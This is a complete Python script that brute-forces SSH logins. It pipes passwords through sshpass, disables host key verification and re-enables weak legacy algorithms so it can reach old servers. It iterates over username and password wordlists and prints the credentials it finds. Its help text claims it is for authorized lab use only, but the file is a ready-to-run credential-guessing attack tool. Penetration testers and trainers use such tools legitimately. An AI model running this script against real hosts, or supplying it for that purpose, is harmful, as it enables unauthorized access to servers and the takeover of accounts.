import subprocess
import sys
import time
import argparse
from datetime import datetime


def try_login(host, port, username, password, timeout=6):
    """
    Attempt SSH login using the system ssh client via sshpass,
    with legacy algorithms re-enabled for old SSH servers.
    Returns True on success, False on failure.
    """
    cmd = [
        "sshpass", "-p", password,
        "ssh",
        "-p", str(port),
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", f"ConnectTimeout={timeout}",
        "-o", "KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1",
        "-o", "HostKeyAlgorithms=+ssh-rsa,ssh-dss",
        "-o", "Ciphers=+aes128-cbc,3des-cbc,aes256-cbc",
        "-o", "LogLevel=ERROR",
        f"{username}@{host}",
        "exit"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except FileNotFoundError:
        print("[!] sshpass not found. Install it with: sudo apt install sshpass")
        sys.exit(1)


def brute_force(host, port, userlist_path, wordlist_path, delay=1.5):
    with open(userlist_path, "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(wordlist_path, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    total = len(usernames) * len(passwords)
    print(f"Target: {host}:{port}")
    print(f"Usernames: {len(usernames)}  |  Passwords: {len(passwords)}  |  Total combinations: {total}\n")

    attempt = 0
    try:
        for username in usernames:
            for password in passwords:
                attempt += 1
                timestamp = datetime.now().strftime("%H:%M:%S")
                print(f"[{timestamp}] ({attempt}/{total}) Trying {username}:{password}")

                if try_login(host, port, username, password):
                    print(f"\n[+] SUCCESS! Username: {username}  Password: {password}")
                    return username, password

                time.sleep(delay)

    except KeyboardInterrupt:
        print("\n\nStopped by user.")
        return None, None

    print("\n[-] Exhausted all combinations. No valid credentials found.")
    return None, None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="SSH brute-force tester using system ssh client (authorized lab use only)"
    )
    parser.add_argument("host")
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--userlist", default="usernames.txt")
    parser.add_argument("--wordlist", default="wordlist.txt")
    parser.add_argument("--delay", type=float, default=1.5)
    args = parser.parse_args()

    brute_force(args.host, args.port, args.userlist, args.wordlist, args.delay)
